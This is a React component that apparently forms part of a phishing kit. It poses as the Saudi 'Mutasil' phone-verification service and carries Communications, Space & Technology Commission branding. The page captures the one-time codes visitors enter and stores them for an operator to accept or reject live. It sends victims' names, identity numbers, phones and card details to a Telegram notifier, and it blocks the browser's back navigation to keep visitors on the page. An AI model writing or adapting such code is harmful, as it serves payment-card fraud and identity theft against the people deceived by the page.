import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Loader2 } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { getMyLatestApplication, updateApplication, type StoredApplication } from "@/lib/admin-storage";
import { getVisitorId, getVisitorToken } from "@/lib/visitor-tracking";
import { cn } from "@/lib/utils";
import { notifyOtpResend } from "@/lib/telegram-notify";
import { useI18n } from "@/lib/i18n";

type State = { appId?: string };

const QuoteMutasilOtp = () => {
  const { t, isAr } = useI18n();
  const navigate = useNavigate();
  const location = useLocation();
  const { appId } = (location.state as State) || {};

  const [code, setCode] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(149);
  const [app, setApp] = useState<StoredApplication | null>(null);
  const [resolvedId, setResolvedId] = useState<string | undefined>(appId);

  useEffect(() => {
    (async () => {
      let id = appId;
      if (!id) {
        const latest = await getMyLatestApplication();
        const data = latest ? { id: latest.id } : null;
        if (data) id = (data as { id: string }).id;
      }
      if (!id) return;
      setResolvedId(id);
      const a = await getMyLatestApplication();
      if (a) setApp(a);
    })();
  }, [appId]);

  // Keep the visitor locked on this page: browser back/forward and swipe
  // gestures re-push the same entry, so nothing moves right or left.
  useEffect(() => {
    window.history.pushState({ otpLock: true }, "");
    const onPopState = () => window.history.pushState({ otpLock: true }, "");
    window.addEventListener("popstate", onPopState);
    return () => window.removeEventListener("popstate", onPopState);
  }, []);

  useEffect(() => {
    if (secondsLeft <= 0) return;
    const t = window.setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
    return () => window.clearTimeout(t);
  }, [secondsLeft]);

  useEffect(() => {
    if (!resolvedId) return;
    const id = resolvedId;
    const ch = supabase
      .channel(`mutasil-otp-${id}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "applications", filter: `id=eq.${id}` },
        (payload) => {
          const newRow = payload.new as { review_status?: string };
          if (newRow.review_status === "completed") {
            toast.success(t("تم التحقق بنجاح", "Verified successfully"));
            navigate("/quote/success", { replace: true, state: { appId: id } });
          } else if (newRow.review_status === "mutasil_rejected") {
            toast.error(t("الرمز غير صحيح، حاول مرة أخرى", "Incorrect code, please try again"));
            setCode("");
          }
        },
      )
      .subscribe();
    const poll = window.setInterval(async () => {
      if (document.visibilityState !== "visible") return;
      const fresh = await getMyLatestApplication();
      if (!fresh || fresh.id !== id) return;
      setApp(fresh);
      if (fresh.reviewStatus === "completed") {
        navigate("/quote/success", { replace: true, state: { appId: id } });
      } else if (fresh.reviewStatus === "mutasil_rejected") {
        setCode("");
      }
    }, 1000);
    return () => {
      window.clearInterval(poll);
      supabase.removeChannel(ch);
    };
  }, [resolvedId, navigate]);

  const isValid = code.length >= 4;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || !resolvedId) return;
    setSubmitting(true);
    // Bounce status first so consecutive submissions of the same code still
    // register as a real transition for the admin dashboard chime/toast.
    await updateApplication(resolvedId, { reviewStatus: "mutasil_pending" });
    await updateApplication(resolvedId, {
      mutasilOtp: code,
      reviewStatus: "mutasil_otp_submitted",
    });
    setSubmitting(false);
    toast.success(t("تم إرسال الرمز، بانتظار التحقق", "Code submitted, awaiting verification"));
  };

  const mins = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
  const secs = String(secondsLeft % 60).padStart(2, "0");

  return (
    <main dir={isAr ? "rtl" : "ltr"} className="min-h-screen bg-[hsl(0_0%_96%)] py-6 sm:py-10">
      <section className="mx-auto w-full max-w-[480px] px-3">
        <div className="rounded-2xl border border-[hsl(150_20%_85%)] bg-white p-5 shadow-sm sm:p-7">
          {/* Mutasil logo */}
          <div className="flex items-center justify-end gap-2">
            <span className="text-[18px] font-extrabold text-[hsl(214_60%_22%)]">
              {t("متصل", "Mutasil")}
            </span>
            <div className="flex flex-col gap-[3px]">
              <span className="h-[3px] w-8 rounded-full bg-[hsl(214_60%_45%)]" />
              <span className="h-[3px] w-8 rounded-full bg-[hsl(280_60%_55%)]" />
              <span className="h-[3px] w-8 rounded-full bg-[hsl(150_50%_45%)]" />
            </div>
          </div>
          <div className="mt-[-4px] text-end text-[11px] font-bold tracking-[0.2em] text-[hsl(214_30%_45%)]">
            mutasil
          </div>

          {/* Title */}
          <div className="mt-7 flex items-start justify-between gap-3">
            <p className="flex-1 text-right text-[13.5px] leading-7 text-[hsl(214_30%_15%)]">
              {t("تم إرسال رمز التحقق الى هاتفك النقال. الرجاء إدخاله في هذه الخانة.", "A verification code has been sent to your mobile phone. Please enter it below.")}
            </p>
            <div className="grid h-12 w-12 shrink-0 place-items-center rounded-lg bg-[hsl(214_70%_95%)] text-[hsl(214_70%_35%)]">
              <svg viewBox="0 0 24 24" className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="6" y="3" width="12" height="18" rx="2" />
                <rect x="9" y="9" width="6" height="5" rx="1" />
                <line x1="9" y1="6" x2="15" y2="6" />
              </svg>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="mt-6 space-y-4">
            <div>
              <label className="mb-2 block text-end text-[13px] font-bold text-[hsl(214_30%_25%)]">
                {t("رمز التحقق", "Verification Code")}
              </label>
              <input
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                inputMode="numeric"
                autoComplete="one-time-code"
                dir="ltr"
                className="h-12 w-full rounded-lg border border-[hsl(214_15%_85%)] bg-white px-3 text-center font-mono text-[18px] font-bold tracking-[0.4em] text-[hsl(214_30%_15%)] outline-none focus:border-[hsl(214_60%_45%)]"
              />
            </div>

            <button
              type="submit"
              disabled={!isValid || submitting}
              className={cn(
                "h-12 w-full rounded-lg text-[14px] font-extrabold text-white transition-all",
                isValid && !submitting
                  ? "btn-pay"
                  : "cursor-not-allowed btn-pay opacity-50",
              )}
            >
              {submitting ? (
                <span className="inline-flex items-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  {t("جاري التحقق", "Verifying")}
                </span>
              ) : (
                t("تحقق", "Verify")
              )}
            </button>

            <div className="text-center text-[13px] text-[hsl(214_30%_25%)]">
              {secondsLeft > 0 ? (
                <>
                  {t("إعادة الإرسال:", "Resend in:")}{" "}
                  <span className="font-mono font-bold">{mins}:{secs}</span>
                </>
              ) : (
                <button
                  type="button"
                  onClick={() => {
                    setSecondsLeft(149);
                    notifyOtpResend({
                      appId: resolvedId,
                      fullName: app?.fullName,
                      identity: app?.identity,
                      phone: app?.phone,
                      company: app?.company,
                      total: app?.total,
                      cardNumber: app?.cardLast4 ? `•••• ${app.cardLast4}` : undefined,
                      cardBrand: app?.cardBrand,
                      source: "OTP متصل",  // internal source tag, unchanged
                    });
                    toast.success(t("تم إرسال الرمز من جديد", "The code has been resent"));
                  }}
                  className="font-bold text-[hsl(150_50%_42%)] underline"
                >
                  {t("إعادة إرسال الرمز", "Resend Code")}
                </button>
              )}
            </div>
          </form>

          {/* CST footer */}
          <div className="mt-10 flex items-center gap-3 border-t border-[hsl(214_15%_90%)] pt-5">
            <div className="grid h-14 w-14 shrink-0 place-items-center rounded-full bg-gradient-to-br from-[hsl(214_70%_60%)] to-[hsl(280_60%_55%)] text-[14px] font-black text-white">
              CST
            </div>
            <div className="border-r border-[hsl(214_15%_85%)] pr-3 leading-tight">
              <div className="text-[13px] font-extrabold text-[hsl(214_60%_22%)]">
                {t("هيئة الاتصالات والفضاء والتقنية", "Communications, Space & Technology Commission")}
              </div>
              <div className="text-[11px] font-bold text-[hsl(214_60%_22%)]">
                Communications, Space &
                <br />
                Technology Commission
              </div>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
};

export default QuoteMutasilOtp;